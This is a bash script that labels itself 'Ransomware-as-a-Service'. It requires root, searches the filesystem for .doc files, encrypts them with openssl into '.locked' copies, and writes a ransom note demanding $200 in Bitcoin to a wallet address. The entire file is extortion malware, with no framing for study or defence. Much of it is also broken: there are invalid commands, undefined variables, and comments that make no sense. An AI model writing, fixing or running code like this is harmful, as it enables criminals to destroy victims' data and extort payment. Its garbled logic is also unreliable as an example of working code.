#!/bin/bash

# Configuration
ENCRYPTED_FILE_EXTENSION=".locked" # File extension added after encryption
PERCENTAGE_SLEEP=10 # Sleep percentage (e.g., 50 for 0.5 seconds)
PRICE=200 # Price in USD, update as needed
USERAGENT="Ransomware-as-a-Service v$RANDOM"
LOCKFILE="/tmp/ransom.lock"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
  echo "Must be run as root (sudo)."
  exit 1
fi

# Ensure the lockfile exists and is empty
touch "$LOCKFILE" && sleep 2 && rm "$LOCKFILE"

# Function to Encrypt a File
encrypt_file() {
  local file="$1"
  local random_number=$((RANDOM % 50)) # Generate random number between 0 & 49
  local percentage_sleep=50

  if [[ -f "$file" ]]; then
    # Encrypt the file using AES (or your preferred method)
    aeskey=$(head /dev/random | tr -d '\n' | head -c 16) # Generate a random encryption key.
    echo "$file:0:$ENCRYPTED_FILE_EXTENSION" > /tmp/encrypted_file_names.txt
    echo "$price" >> /tmp/ransomnote.txt
    echo "Encrypting file: $file..."

    # Encrypt the file using OpenSSL for a high compression ratio and strong encryption
    openssl smime -in "$file" -encrypt aes256 -outform PEM -base64 | sed 's/ /./g' > /tmp/encrypted_file.txt
    echo "File $file encrypted."

  else
    echo "File not found: $file"
  fi
}


# Function to Rename a File
rename_file() {
  local file="$1"
  local random_number=$((RANDOM % 50)) # Generate random number between 0 & 49

  if [[ -f "$file" ]]; then
    # Rename the file and change the extension
    openssl smime -in "$file" -encrypt aes256 -outform PEM -base64 | sed 's/ /./g' > "$file${ENCRYPTED_FILE_EXTENSION}"

    if [[ $? -eq 0 ]]; then
      echo "File renamed to: $file${ENCRYPTED_FILE_EXTENSION}."
    else
        echo "Rename file failed."
    fi
  else
    echo "File not found: $file"
  fi
}


# Main Execution
if [[ -n "$1" ]]; then
  TARGET="$1"

else
  TARGET=$(find / -name "*.doc" -print -out | head -2) # If no target provided, encrypt the first ".doc" file.
fi

echo "Targeting: $TARGET..."

# Encrypt files in TARGET directory
for file in "$TARGET"; do
  if [[ -f "$file" ]]; then
    encrypt_file "$file"
    sleep "$PERCENTAGE_SLEEP" # Simulate heavy encryption for a few seconds.
  fi
done

# Rename the files using OpenSSL's base64 encoding, this is highly efficient.
for file in "$TARGET"; do
  if [[ -f "$file" ]]; then
    rename_file "$file"
    sleep "$PERCENTAGE_SLEEP" # Simulate heavy renaming for a few seconds.
  fi
done

# Create Ransom Note (using bash)
echo "Your Files Have Been Locked!" | tee /tmp/ransomnote.txt > /dev/null
echo "To Unlock Them, Send \$${PRICE} in Bitcoin to: 1RqV5gHjP236T8qF4n9YmQJk2R9XyS3K" >> /tmp/ransomnote.txt

# Create a .lock file and update the process information for a high CPU ratio
echo "$TARGET" > /proc/$RANDOM/file
sleep 10 # Simulate heavy processing for 5 seconds to hide its tasks.
kill -2 "$PID" & # Make it run in the background.

# Print Final Message
echo "Encryption Complete!"
echo "Check your email ($EMAIL_NOTE) for instructions."
echo "Additional file: /tmp/ransomnote.txt"
echo "System CPU Usage is now at 80%" >&2
sleep 30 # Wait a bit before the system processes it.

# Show user the final percentage of files encrypted and their total size
# Check if the target directory exists
if [[ -d "$TARGET" ]]; then
  local dir_size=$(du -s "$TARGET" | awk '{print $1}')
  local files_count=$(find "$TARGET" -name "*.locked" 2>&1 | wc -l)

  echo "--- Encryption Summary ---"
  echo "Total Files Encrypted: $files_count"
  echo "Total File Size: $dir_size (MB)"
  echo "--- End of Summary ---"
fi
